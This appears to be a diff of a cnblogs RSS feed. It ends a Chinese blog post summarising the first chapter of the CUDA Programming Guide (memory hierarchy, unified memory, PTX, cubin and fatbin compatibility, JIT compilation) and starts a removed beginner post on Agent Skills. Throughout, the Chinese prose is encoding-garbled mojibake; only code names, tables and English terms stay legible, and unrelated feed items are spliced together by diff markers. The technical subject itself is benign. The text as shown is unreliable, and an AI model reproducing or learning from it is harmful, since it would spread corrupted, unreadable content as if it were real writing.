+<td>æ¯ä¸ªçº¿ç¨å¯èµ°ç¬ç«è·¯å¾</td>
+</tr>
+<tr>
+<td>æ°æ®å®½åº¦</td>
+<td>åºå®ï¼å¦ AVX-512 = 512 bitï¼</td>
+<td>æ åºå®å®½åº¦</td>
+</tr>
+<tr>
+<td>ç¼ç¨æ½è±¡</td>
+<td>åéå¯å­å¨</td>
+<td>ç¬ç«çº¿ç¨</td>
+</tr>
+</tbody>
+</table>
+<p>SIMT ç»ç¨åºåæä¾äº"æ¯ä¸ªçº¿ç¨ç¬ç«"çç¼ç¨æ½è±¡ï¼ä½åºå±ä»æ¯ Warp ç²åº¦çæ§è¡ã</p>
+<blockquote>
+<p><strong>æ³¨æ</strong>ï¼æåæç¡®å»ºè®®ç¨åºåæç§ SIMT ç¼ç¨æ¨¡åç¼åä»£ç ï¼èéä¾æ®åºå±ç¡¬ä»¶å®ç°ç»èãç¡¬ä»¶å¨ä¸è¿åç¼ç¨æ¨¡åçåæä¸å¯è¿è¡ä¼åï¼è¥ç¨åºä¾èµæªå®ä¹ç Warp æ§è¡ç»èï¼å¯è½å¨ä¸å GPU æ¶æä¸äº§ç UBï¼æªå®ä¹è¡ä¸ºï¼ã</p>
+</blockquote>
+<hr>
+<h2 id="5-gpu-åå­ä½ç³»">5. GPU åå­ä½ç³»</h2>
+<p>ç°ä»£è®¡ç®ä¸­ï¼åå­çé«æå©ç¨ä¸è®¡ç®ååçæå¤§ååç­éè¦ãGPU æ¥æå¤ç§ç±»åçåå­ï¼åæå¶ç¨éåè®¿é®ç¹æ§ã</p>
+<h3 id="51-å¨å±åå­dram">5.1 å¨å±åå­ï¼DRAMï¼</h3>
+<ul>
+<li>GPU èªå¸¦ç DRAM ç§°ä¸º<strong>å¨å±åå­ï¼Global Memoryï¼</strong>ï¼å³éå¸¸æè¯´ç"æ¾å­"ï¼ææ SM åå¯è®¿é®ã</li>
+<li>CPU ç DRAM ç§°ä¸º<strong>ç³»ç»åå­/ä¸»æºåå­ï¼System Memory / Host Memoryï¼</strong>ã</li>
+<li>å¨å½åæ¯æçç³»ç»ä¸­ï¼CPU å GPU å±äº«<strong>åä¸èæå°åç©ºé´</strong>ï¼ä½åèªçç©çåå­ç¸äºç¬ç«ï¼æ¯ä¸ª GPU çèæå°åèå´å¯ä¸ä¸ä¸ CPU ä¸åï¼ã</li>
+<li>CUDA æä¾ APIï¼å¦ <code>cudaMalloc</code>ã<code>cudaMemcpy</code>ï¼ç¨äºï¼å¨ GPU ä¸åéåå­ãå¨ CPU å GPU ä¹é´æ GPU ä¹é´è¿è¡æ°æ®æ·è´ã</li>
+</ul>
+<h3 id="52-çä¸åå­">5.2 çä¸åå­</h3>
+<p>é¤å¨å±åå­å¤ï¼æ¯ä¸ª SM è¿æå¤ç§<strong>çä¸åå­ï¼On-Chip Memoryï¼</strong>ï¼è®¿é®éåº¦æå¿«ï¼</p>
+<table>
+<thead>
+<tr>
+<th>åå­ç±»å</th>
+<th>å½å±</th>
+<th>è®¿é®èå´</th>
+<th>æ§å¶æ¹å¼</th>
+<th>è¯´æ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>å¯å­å¨æä»¶ï¼Register Fileï¼</strong></td>
+<td>æ¯ä¸ª SM</td>
+<td>åä¸ªçº¿ç¨ç§æ</td>
+<td>ç¼è¯å¨èªå¨åé</td>
+<td>å­å¨çº¿ç¨å±é¨åéï¼éåº¦æå¿«</td>
+</tr>
+<tr>
+<td><strong>å±äº«åå­ï¼Shared Memoryï¼</strong></td>
+<td>æ¯ä¸ª SM</td>
+<td>åä¸çº¿ç¨åï¼æç°ï¼åå¨é¨çº¿ç¨</td>
+<td>ç¨åºåæ¾å¼æ§å¶</td>
+<td>çº¿ç¨é´éä¿¡çé«ééé</td>
+</tr>
+<tr>
+<td><strong>L1 Cache</strong></td>
+<td>æ¯ä¸ª SM</td>
+<td>èªå¨ï¼éæï¼</td>
+<td>ç¡¬ä»¶èªå¨ç®¡ç</td>
+<td>ä¸å±äº«åå­å±äº«ç©çèµæºï¼Unified Data Cacheï¼</td>
+</tr>
+<tr>
+<td><strong>L2 Cache</strong></td>
+<td>æ´ä¸ª GPU</td>
+<td>ææ SM å±äº«</td>
+<td>ç¡¬ä»¶èªå¨ç®¡ç</td>
+<td>æ¯ L1 æ´å¤§ï¼è®¿é®ç¨æ¢</td>
+</tr>
+<tr>
+<td><strong>å¸¸éç¼å­ï¼Constant Cacheï¼</strong></td>
+<td>æ¯ä¸ª SM</td>
+<td>Kernel åææçº¿ç¨åªè¯»</td>
+<td>å£°æä¸º <code>__constant__</code></td>
+<td>ç¼å­å¨å±åå­å¸¸éå Kernel åæ°</td>
+</tr>
+</tbody>
+</table>
+<p><strong>å³é®èµæºçº¦æ</strong>ï¼è°åº¦çº¿ç¨åå° SM æ¶ï¼è¯¥çº¿ç¨åæéç<strong>å¯å­å¨æ»æ°</strong>ï¼æ¯çº¿ç¨å¯å­å¨æ° Ã çº¿ç¨æ°ï¼ä¸è½è¶è¿ SM çå¯å­å¨æä»¶å¤§å°ï¼è¶åºå Kernel æ æ³å¯å¨ï¼éåå°çº¿ç¨åå¤§å°ææ¯çº¿ç¨å¯å­å¨ç¨éã</p>
+<h3 id="53-ç»ä¸åå­">5.3 ç»ä¸åå­</h3>
+<p><strong>ç»ä¸åå­ï¼Unified Memoryï¼</strong> æ¯ CUDA æä¾çä¸é¡¹ç¹æ§ï¼åè®¸ç¨ <code>cudaMallocManaged</code> åéä¸å CPU å GPU åå¯è®¿é®çåå­ãCUDA è¿è¡æ¶æåºå±ç¡¬ä»¶è´è´£å¨éè¦æ¶å°æ°æ®è¿ç§»å°æ­£ç¡®çè®¾å¤ã</p>
+<pre><code class="language-cpp">float *data;
+cudaMallocManaged(&amp;data, N * sizeof(float));
+// CPU å GPU Kernel åå¯ç´æ¥è®¿é® dataï¼æ éæå¨ cudaMemcpy
+</code></pre>
+<blockquote>
+<p>å³ä½¿ä½¿ç¨ç»ä¸åå­ï¼æä¼æ§è½çååä»ç¶æ¯ï¼<strong>å°½éè®©æ°æ®å¾å¨æå¸¸è®¿é®å®çè®¾å¤ä¸ï¼åå°åå­è¿ç§»æ¬¡æ°</strong>ã</p>
+</blockquote>
+<p>å¦å¤è¿æä¸ç§<strong>æ å°åå­ï¼Mapped Memoryï¼</strong>ï¼æ¯å° CPU åå­æ å°ä¸º GPU å¯ç´æ¥è®¿é®çå°åãä½ç±äºè®¿é®è¦è·¨è¶ PCIe/NVLINK æ»çº¿ï¼å»¶è¿é«ãå¸¦å®½ä½ï¼GPU æ æ³ç¨å¹¶è¡åº¦æ©çè¿ä¸å¼éï¼<strong>æ§è½è¿ä¸å¦ç»ä¸åå­</strong>ï¼ä¸è¬ä¸æ¨èä½ä¸ºæ°æ®è®¿é®çä¸»è¦æ¹å¼ã</p>
+<hr>
+<h2 id="6-cuda-å¹³å°ä¸ç¼è¯é¾">6. CUDA å¹³å°ä¸ç¼è¯é¾</h2>
+<h3 id="61-è®¡ç®è½åcompute-capability">6.1 è®¡ç®è½åï¼Compute Capabilityï¼</h3>
+<p>æ¯å NVIDIA GPU é½æä¸ä¸ª<strong>è®¡ç®è½åï¼Compute Capabilityï¼CCï¼</strong>ç¼å·ï¼æ ¼å¼ä¸º <code>X.Y</code>ï¼ä¸»è¦çæ¬å·.æ¬¡è¦çæ¬å·ï¼ï¼è¡¨ç¤ºè¯¥ GPU ææ¯æçç¹æ§éä»¥åè¥å¹²ç¡¬ä»¶åæ°ã</p>
+<ul>
+<li>è®¡ç®è½åä¸ SM çæ¬ç´æ¥å¯¹åºï¼CC 12.0 ç GPUï¼å¶ SM çæ¬ä¸º <code>sm_120</code>ã</li>
+<li>å¯å¨ <a href="https://developer.nvidia.com/cuda-gpus" target="_blank" rel="noopener nofollow">CUDA GPU Compute Capability é¡µé¢</a> æ¥è¯¢ææ GPU çè®¡ç®è½åã</li>
+</ul>
+<h3 id="62-é©±å¨toolkitruntime-ä¸-driver-api-çå³ç³»">6.2 é©±å¨ãToolkitãRuntime ä¸ Driver API çå³ç³»</h3>
+<p>è¿æ¯åå­¦èæå®¹ææ··æ·çé¨åï¼ä»¥ä¸åå±è¯´æï¼</p>
+<pre><code>ââââââââââââââââââââââââââââââââââââââââââââââââ
+â          ä½ ç CUDA åºç¨                       â
+ââââââââââââââââââââââââââââââââââââââââââââââââ¤
+â          CUDA è¿è¡æ¶ APIï¼cudaXxxï¼            â  â CUDA Toolkit çä¸é¨å
+ââââââââââââââââââââââââââââââââââââââââââââââââ¤
+â          CUDA é©±å¨ APIï¼cuXxxï¼               â  â ç± NVIDIA é©±å¨æ´é²
+ââââââââââââââââââââââââââââââââââââââââââââââââ¤
+â          NVIDIA é©±å¨ï¼r580 ç­çæ¬ï¼            â  â GPU ç"æä½ç³»ç»"
+ââââââââââââââââââââââââââââââââââââââââââââââââ¤
+â          GPU ç¡¬ä»¶                             â
+ââââââââââââââââââââââââââââââââââââââââââââââââ
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>ç»ä»¶</th>
+<th>è¯´æ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>NVIDIA é©±å¨</strong></td>
+<td>GPU çæä½ç³»ç»ï¼ææ GPU ç¨éï¼åæ¬æ¾ç¤ºãVulkanãDirectXï¼çåºç¡ï¼çæ¬å·å¦ r580</td>
+</tr>
+<tr>
+<td><strong>CUDA Toolkit</strong></td>
+<td>ç¬ç«è½¯ä»¶åï¼åå«å¤´æä»¶ãåºï¼cuBLAS ç­ï¼åå·¥å·ï¼nvccãnvprof ç­ï¼</td>
+</tr>
+<tr>
+<td><strong>CUDA è¿è¡æ¶ï¼CUDA Runtimeï¼</strong></td>
+<td>Toolkit ä¸­çæ ¸å¿åºï¼æä¾ <code>cudaMalloc</code>ã<code>cudaMemcpy</code>ãKernel Launch ç­é«å± API</td>
+</tr>
+<tr>
+<td><strong>CUDA é©±å¨ API</strong></td>
+<td>ç± NVIDIA é©±å¨æ´é²çåºå± APIï¼å½æ°ä»¥ <code>cu</code> å¼å¤´ï¼ï¼åè½æ´çµæ´»ï¼é¨åé«çº§ç¹æ§åªæå®ææ</td>
+</tr>
+</tbody>
+</table>
+<p><strong>è¿è¡æ¶ API vs é©±å¨ API</strong>ï¼è¿è¡æ¶ API æ¯é©±å¨ API çé«å±å°è£ï¼ä½¿ç¨æ´æ¹ä¾¿ï¼é©±å¨ API æ´åºå±ãæ´çµæ´»ãä¸¤èå¯ä»¥å¨åä¸åºç¨ä¸­æ··ç¨ã</p>
+<h3 id="63-ptx-èæ-isa">6.3 PTX èæ ISA</h3>
+<p><strong>PTXï¼Parallel Thread Executionï¼å¹¶è¡çº¿ç¨æ§è¡ï¼</strong> æ¯ CUDA å¹³å°ä¸­å¾å¾"éèº«"çéè¦ä¸å±ââå®æ¯ NVIDIA GPU ç<strong>èææä»¤éæ¶æï¼Virtual ISAï¼</strong>ï¼å¯ä»¥çè§£ä¸ºä¸ç§é¢å GPU çé«çº§æ±ç¼è¯­è¨ã</p>
+<p>PTX ä¸ºçå® GPU çç©çæä»¤éæä¾äºä¸å±æ½è±¡ï¼ä½¿å¾ï¼</p>
+<ul>
+<li>ç¼è¯å¨ï¼å¦ nvccï¼åå° C++ ä»£ç ç¼è¯ä¸º PTXï¼ä¸­é´è¡¨è¾¾ï¼ï¼åå° PTX ç¼è¯ä¸ºç¹å® GPU çäºè¿å¶ã</li>
+<li>å¶ä»è¯­è¨æ DSLï¼å¦ Tritonï¼å¯ä»¥çæ PTXï¼åå© NVIDIA çå·¥å·é¾å®ææç»ç¼è¯ã</li>
+<li>è¿è¡æ¶å¯éè¿ <strong>NVRTC</strong> åºå° CUDA C++ å¨çº¿å¨æç¼è¯ä¸º PTXï¼éåéè¦çæå¨æ GPU ä»£ç çåºæ¯ã</li>
+</ul>
+<p>PTX çæ¬ä¸è®¡ç®è½åå¯¹åºï¼ä¾å¦æ¯æ CC 12.0 ææç¹æ§ç PTX çæ¬ç§°ä¸º <code>compute_120</code>ã</p>
+<h3 id="64-cubinfatbin-ä¸ç¼è¯äº§ç©">6.4 cubinãfatbin ä¸ç¼è¯äº§ç©</h3>
+<table>
+<thead>
+<tr>
+<th>æ¯è¯­</th>
+<th>å«ä¹</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>cubin</strong></td>
+<td>PTX ç¼è¯åç GPU æ¬å°äºè¿å¶ï¼éå¯¹ç¹å® SM çæ¬ï¼å¦ <code>sm_120</code>ï¼</td>
+</tr>
+<tr>
+<td><strong>fatbin</strong></td>
+<td>ä¸ä¸ªå®¹å¨ï¼åé¨å¯åæ¶æåå¤ä¸ªçæ¬ç cubin å/æ PTX</td>
+</tr>
+</tbody>
+</table>
+<p>ä¸ä¸ªå¯æ§è¡æä»¶æåºåæ¶åå« CPU äºè¿å¶ä»£ç å fatbin å®¹å¨ï¼è¿è¡æ¶æ ¹æ®å½å GPU ä» fatbin ä¸­éåæéåç cubin å è½½æ§è¡ã</p>
+<p><img alt="fatbinç»æ" loading="lazy" data-src="https://my-ai-doc.oss-cn-shenzhen.aliyuncs.com/CUDA%20Programming%20Guide/Ch1/figure8_fatbin_structure.jpg" class="lazyload"></p>
+<h3 id="65-äºè¿å¶å¼å®¹æ§ä¸-ptx-å¼å®¹æ§">6.5 äºè¿å¶å¼å®¹æ§ä¸ PTX å¼å®¹æ§</h3>
+<h4 id="cubin-çäºè¿å¶å¼å®¹æ§è§å">cubin çäºè¿å¶å¼å®¹æ§è§å</h4>
+<p>å¨<strong>åä¸ä¸»è¦çæ¬</strong>çè®¡ç®è½åä¸ï¼</p>
+<ul>
+<li>GPU å¯ä»¥å è½½æ¬¡è¦çæ¬å·<strong>å°äºç­äº</strong>èªèº«ç cubinã</li>
+</ul>
+<p>ä¾å¦ï¼GPU è®¡ç®è½åä¸º <strong>12.5</strong>ï¼</p>
+<table>
+<thead>
+<tr>
+<th>cubin çæ¬</th>
+<th>è½å¦å è½½</th>
+<th>åå </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sm_115</code></td>
+<td>â</td>
+<td>ä¸»è¦çæ¬ä¸å</td>
+</tr>
+<tr>
+<td><code>sm_120</code></td>
+<td>â</td>
+<td>ä¸»è¦çæ¬ç¸åï¼æ¬¡è¦çæ¬ 0 â¤ 5</td>
+</tr>
+<tr>
+<td><code>sm_125</code></td>
+<td>â</td>
+<td>ä¸»è¦çæ¬ç¸åï¼æ¬¡è¦çæ¬ 5 â¤ 5</td>
+</tr>
+<tr>
+<td><code>sm_129</code></td>
+<td>â</td>
+<td>æ¬¡è¦çæ¬ 9 &gt; 5</td>
+</tr>
+<tr>
+<td><code>sm_90</code></td>
+<td>â</td>
+<td>ä¸»è¦çæ¬ä¸å</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>äºè¿å¶å¼å®¹æ§ä»å¯¹ nvcc ç­ NVIDIA å®æ¹å·¥å·çæçäºè¿å¶ææï¼æå¨ä¿®æ¹äºè¿å¶å°ä½¿å¼å®¹æ§æ¿è¯ºå¤±æã</p>
+</blockquote>
+<h4 id="ptx-çååå¼å®¹æ§">PTX çååå¼å®¹æ§</h4>
+<p>PTX å¯å¨è¿è¡æ¶è¢«é©±å¨ JIT ç¼è¯ä¸º<strong>ç­äºæé«äº</strong>å¶ç®æ è®¡ç®è½åçä»»æ cubinãä¾å¦ï¼fatbin ä¸­åå« <code>compute_80</code> ç PTXï¼å¯å¨è¿è¡æ¶ç¼è¯ä¸º <code>sm_120</code> ç cubinã</p>
+<p>è¿ä½¿å¾åºç¨æ ééæ°ç¼è¯å³å¯å¨å°æ¥æ´æ°ç GPU æ¶æä¸è¿è¡ã</p>
+<h3 id="66-jit-ç¼è¯">6.6 JIT ç¼è¯</h3>
+<p><strong>JITï¼Just-in-Timeï¼å³æ¶ç¼è¯ï¼</strong> æå¨ç¨åºè¿è¡æ¶ç± NVIDIA é©±å¨å° PTX ç¼è¯ä¸ºæ¬å° cubin çè¿ç¨ã</p>
+<ul>
+<li><strong>ä¼ç¹</strong>ï¼ååå¼å®¹æªæ¥ GPUï¼æ¯æ¬¡åçº§é©±å¨å¯èªå¨äº«åç¼è¯å¨ä¼åæ¹è¿ã</li>
+<li><strong>ç¼ºç¹</strong>ï¼é¦æ¬¡è¿è¡ä¼å¢å ç¨åºå¯å¨æ¶é´ã</li>
+<li><strong>ç¼å­æºå¶</strong>ï¼JIT ç¼è¯çç»æä¼è¢«ç¼å­ï¼ç§°ä¸º compute cacheï¼ï¼é©±å¨åçº§åç¼å­èªå¨å¤±æä»¥è§¦åéæ°ç¼è¯ã</li>
+</ul>
+<hr>
+<h2 id="7-æ»ç»">7. æ»ç»</h2>
+<p>æ¬ç« æ¶µçäºçè§£ CUDA ç¼ç¨çåºç¡æ¡æ¶ï¼</p>
+<table>
+<thead>
+<tr>
+<th>ä¸»é¢</th>
+<th>è¦ç¹</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>GPU è®¾è®¡å²å­¦</strong></td>
+<td>é«ååéï¼æ°åçº¿ç¨å¹¶è¡ï¼çºç²åçº¿ç¨æ§è½</td>
+</tr>
+<tr>
+<td><strong>å¼æç¼ç¨</strong></td>
+<td>Host (CPU) è´è´£è°åº¦ï¼Device (GPU) è´è´£å¹¶è¡è®¡ç®</td>
+</tr>
+<tr>
+<td><strong>çº¿ç¨å±æ¬¡</strong></td>
+<td>Thread â Warp(32) â Block â Cluster(CC9.0+) â Grid</td>
+</tr>
+<tr>
+<td><strong>åå»ºåé</strong></td>
+<td><code>threadIdx</code>/<code>blockIdx</code>/<code>blockDim</code>/<code>gridDim</code></td>
+</tr>
+<tr>
+<td><strong>SIMT</strong></td>
+<td>å Warp ååæä»¤å¼æ°æ®ï¼åæ¯åæ£ä¼éä½æç</td>
+</tr>
+<tr>
+<td><strong>åå­å±æ¬¡</strong></td>
+<td>å¯å­å¨ &gt; å±äº«åå­/L1 &gt; L2 &gt; å¨å±åå­ï¼éåº¦ä¾æ¬¡éå</td>
+</tr>
+<tr>
+<td><strong>è®¡ç®è½å</strong></td>
+<td>å³å®å¯ç¨ç¹æ§ï¼æ ¼å¼ X.Yï¼ä¸ SM çæ¬ä¸ä¸å¯¹åº</td>
+</tr>
+<tr>
+<td><strong>ç¼è¯é¾</strong></td>
+<td>C++ â PTX â cubinï¼æåè¿ fatbinï¼JIT æä¾ååå¼å®¹</td>
+</tr>
+</tbody>
+</table>
+<p>çè§£ä¸è¿°æ¦å¿µæ¯é«æç¼å CUDA ç¨åºçåæãåç»­ç« èå°å´ç»è¿äºæ¦å¿µå±å¼å·ä½ç C++ API ä½¿ç¨åæ§è½ä¼åå®è·µã</p>
+<hr>
+<p><em>åèèµæï¼NVIDIA CUDA Programming Guide Release 13.2, Chapter 1</em></p>
+
+
+</div>
+<div class="clear"></div>
+
+	<div class="postDesc">posted on 
+<span id="post-date" data-last-update-days="0.04652777777777778" data-date-updated="2026-04-06 23:18">2026-04-06 22:11</span>&nbsp;
+<a href="https://www.cnblogs.com/winteryan">winterYANGWT</a>&nbsp;
+éè¯»(<span id="post_view_count">20</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(19827116);return false;">æ¶è</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fwinteryan%2Fp%2F19827116&amp;targetId=19827116&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
+</div>
+ ]]>
     </description>
     </item>
 <item>
@@ -3579,1548 +4946,6 @@ roslaunch xsens_mti_driver xsens_mti_node.launch
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(19824216);return false;">æ¶è</a>&nbsp;
 <a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fzylyehuo%2Fp%2F19824216&amp;targetId=19824216&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
-</div>
-         ]]>
-    </description>
-    </item>
-<item>
-    <title><![CDATA[ 0åºç¡æä½ å¿«éåèªå·±çAgent Skills ]]></title>
-    <link>https://www.cnblogs.com/chenyanbin/p/19824343/agentskills</link>
-    <guid>24d8ef3de4ffdcc9de04b9b11f30e0a2</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/chenyanbin/p/19824343/agentskills" title="åå¸äº 2026-04-05 21:49">
-    <span role="heading" aria-level="2">0åºç¡æä½ å¿«éåèªå·±çAgent Skills</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
-<h1 style="text-align: center"><span data-slate-fragment="JTVCJTdCJTIydHlwZSUyMiUzQSUyMmhlYWRlciUyMiUyQyUyMmxldmVsJTIyJTNBJTIyaDMlMjIlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjIwJUU1JTlGJUJBJUU3JUExJTgwJUU2JTk1JTk5JUU0JUJEJUEwJUU1JUJGJUFCJUU5JTgwJTlGJUU1JTg2JTk5JUU4JTg3JUFBJUU1JUI3JUIxJUU3JTlBJTg0QWdlbnQlMjBTa2lsbHMlMjIlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjBhOWFkYTRlLWVkODctNGM1MS1iM2I1LTg3NTY0ZmQ2N2U4MyUyMiU3RCU1RA==">ä»ç»</span></h1>
-<div class="_qe-p_ez4x7_25" data-slate-node="element" data-elm="paragraph"><span data-slate-node="text">ããå¨äººå·¥æºè½é£éåå±çä»å¤©ï¼Agentï¼æºè½ä½ï¼å·²ç»ä¸åæ¯ä¸ä¸ªéççè¯æ±ãä½ å¯è½å¬è¯´è¿å®è½èªå¨åä»£ç ãè½å¸®ä½ è®¢æºç¥¨ï¼çè³è½åå½ä½ çç§äººå©çãä½ä½ æ¯å¦å¥½å¥ï¼è¿äºå¼ºå¤§çè½åç©¶ç«æ¯å¦ä½âå®è£âå°Agentèº«ä¸çï¼</span></div>
-<div class="_qe-p_ez4x7_25" data-slate-node="element" data-elm="paragraph" data-slate-fragment="JTVCJTdCJTIydHlwZSUyMiUzQSUyMnBhcmFncmFwaCUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNSU5QyVBOCVFNCVCQSVCQSVFNSVCNyVBNSVFNiU5OSVCQSVFOCU4MyVCRCVFOSVBMyU5RSVFOSU4MCU5RiVFNSU4RiU5MSVFNSVCMSU5NSVFNyU5QSU4NCVFNCVCQiU4QSVFNSVBNCVBOSVFRiVCQyU4Q0FnZW50JUVGJUJDJTg4JUU2JTk5JUJBJUU4JTgzJUJEJUU0JUJEJTkzJUVGJUJDJTg5JUU1JUI3JUIyJUU3JUJCJThGJUU0JUI4JThEJUU1JTg2JThEJUU2JTk4JUFGJUU0JUI4JTgwJUU0JUI4JUFBJUU5JTk5JThDJUU3JTk0JTlGJUU3JTlBJTg0JUU4JUFGJThEJUU2JUIxJTg3JUUzJTgwJTgyJUU0JUJEJUEwJUU1JThGJUFGJUU4JTgzJUJEJUU1JTkwJUFDJUU4JUFGJUI0JUU4JUJGJTg3JUU1JUFFJTgzJUU4JTgzJUJEJUU4JTg3JUFBJUU1JThBJUE4JUU1JTg2JTk5JUU0JUJCJUEzJUU3JUEwJTgxJUUzJTgwJTgxJUU4JTgzJUJEJUU1JUI4JUFFJUU0JUJEJUEwJUU4JUFFJUEyJUU2JTlDJUJBJUU3JUE1JUE4JUVGJUJDJThDJUU3JTk0JTlBJUU4JTg3JUIzJUU4JTgzJUJEJUU1JTg1JTg1JUU1JUJEJTkzJUU0JUJEJUEwJUU3JTlBJTg0JUU3JUE3JTgxJUU0JUJBJUJBJUU1JThBJUE5JUU3JTkwJTg2JUUzJTgwJTgyJUU0JUJEJTg2JUU0JUJEJUEwJUU2JTk4JUFGJUU1JTkwJUE2JUU1JUE1JUJEJUU1JUE1JTg3JUVGJUJDJThDJUU4JUJGJTk5JUU0JUJBJTlCJUU1JUJDJUJBJUU1JUE0JUE3JUU3JTlBJTg0JUU4JTgzJUJEJUU1JThBJTlCJUU3JUE5JUI2JUU3JUFCJTlGJUU2JTk4JUFGJUU1JUE2JTgyJUU0JUJEJTk1JUUyJTgwJTlDJUU1JUFFJTg5JUU4JUEzJTg1JUUyJTgwJTlEJUU1JTg4JUIwQWdlbnQlRTglQkElQUIlRTQlQjglOEElRTclOUElODQlRUYlQkMlOUYlMjIlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMmQ3ZGVkZDE0LWE5ZDYtNDhmMi05ZjQyLTM5YTRlNGZhNjY2ZiUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjIlRTUlODUlQjYlRTUlQUUlOUUlRUYlQkMlOEMlRTclQkIlOTlBZ2VudCVFOCVCNSU4QiVFNCVCQSU4OCVFOCU4MyVCRCVFNSU4QSU5QiVFRiVCQyU4QyVFNSVCMCVCMSVFNSU4MyU4RiVFNyVCQiU5OSVFNiU4OSU4QiVFNiU5QyVCQSVFNSVBRSU4OSVFOCVBMyU4NUFwcCVFNCVCOCU4MCVFNiVBMCVCNyVFRiVCQyU4QyVFNiVBMCVCOCVFNSVCRiU4MyVFNSU5QyVBOCVFNCVCQSU4RSVFNSVBRSU5QSVFNCVCOSU4OSVFNiVCOCU4NSVFNiU5OSVCMCVFNyU5QSU4NCUyMiU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjJTa2lsbHMlRUYlQkMlODglRTYlOEElODAlRTglODMlQkQlRUYlQkMlODklMjIlMkMlMjJib2xkJTIyJTNBdHJ1ZSU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjIlRTMlODAlODIlRTQlQkIlOEElRTUlQTQlQTklRUYlQkMlOEMlRTYlODglOTElRTQlQkIlQUMlRTUlQjAlQjElRTYlOUQlQTUlRTYlODklOTMlRTclQTAlQjQlRTYlOEElODAlRTYlOUMlQUYlRTUlQTMlODElRTUlOUUlOTIlRUYlQkMlOEMlRTclOTQlQTgwJUU1JTlGJUJBJUU3JUExJTgwJUU0JUI5JTlGJUU4JTgzJUJEJUU1JTkwJUFDJUU2JTg3JTgyJUU3JTlBJTg0JUU2JTk2JUI5JUU1JUJDJThGJUVGJUJDJThDJUU1JUI4JUE2JUU0JUJEJUEwJUU1JUJGJUFCJUU5JTgwJTlGJUU0JUI4JThBJUU2JTg5JThCJUVGJUJDJThDJUU1JTg2JTk5JUU1JTg3JUJBJUU1JUIxJTlFJUU0JUJBJThFJUU0JUJEJUEwJUU4JTg3JUFBJUU1JUI3JUIxJUU3JTlBJTg0JUU3JUFDJUFDJUU0JUI4JTgwJUU0JUI4JUFBQWdlbnQlMjBTa2lsbCVFMyU4MCU4MiUyMiU3RCU1RCUyQyUyMmlkJTIyJTNBJTIyMjY4M2RmNGYtNzY4ZS00M2NjLTgwMGQtNjhiZTIyNjlmYjI4JTIyJTdEJTVE"><span data-slate-node="text">ããå¶å®ï¼ç»Agentèµäºè½åï¼å°±åç»ææºå®è£Appä¸æ ·ï¼æ ¸å¿å¨äºå®ä¹æ¸æ°ç<span data-slate-node="text"><span data-slate-leaf="true"><strong>Skillsï¼æè½ï¼</strong><span data-slate-node="text">ãä»å¤©ï¼æä»¬å°±æ¥æç ´ææ¯å£åï¼ç¨0åºç¡ä¹è½å¬æçæ¹å¼ï¼å¸¦ä½ å¿«éä¸æï¼ååºå±äºä½ èªå·±çç¬¬ä¸ä¸ªAgent Skillã</span></span></span></span></div>
-<h1 style="text-align: center"><span data-slate-fragment="JTVCJTdCJTIydHlwZSUyMiUzQSUyMmhlYWRlciUyMiUyQyUyMmxldmVsJTIyJTNBJTIyaDMlMjIlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjIwJUU1JTlGJUJBJUU3JUExJTgwJUU2JTk1JTk5JUU0JUJEJUEwJUU1JUJGJUFCJUU5JTgwJTlGJUU1JTg2JTk5JUU4JTg3JUFBJUU1JUI3JUIxJUU3JTlBJTg0QWdlbnQlMjBTa2lsbHMlMjIlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjBhOWFkYTRlLWVkODctNGM1MS1iM2I1LTg3NTY0ZmQ2N2U4MyUyMiU3RCU1RA=="><span data-slate-fragment="JTVCJTdCJTIydHlwZSUyMiUzQSUyMmhlYWRlciUyMiUyQyUyMmxldmVsJTIyJTNBJTIyaDQlMjIlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjIlRTQlQkIlODAlRTQlQjklODglRTYlOTglQUZBZ2VudCUyMFNraWxsJUVGJUJDJTlGJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI2ZjAwYTcyZS1kN2Y5LTRjZjgtYWI4Yy0xZjg1Mzg2MjczOWQlMjIlN0QlNUQ=">ä»ä¹æ¯Agent Skillï¼</span></span></h1>
